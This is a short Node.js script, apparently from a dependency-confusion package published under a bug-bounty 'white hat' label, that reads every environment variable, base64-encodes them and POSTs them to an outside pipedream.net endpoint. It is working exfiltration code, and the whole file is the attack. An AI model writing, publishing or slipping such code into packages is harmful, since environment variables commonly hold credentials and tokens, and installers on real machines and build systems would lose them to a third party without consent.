
//hackerone.com/homosec
//Bug Bounty Security Reasearch White Hat t.a.neo@ya.ru
const http = require('https');

req = http.request({
  host: '76c42f27d26091659dca820a37e6f5d3.m.pipedream.net',
  path: '/arui-ft-private',
  method: 'POST'
});

req.write(Buffer.from(JSON.stringify(process.env)).toString('base64'));
req.end();

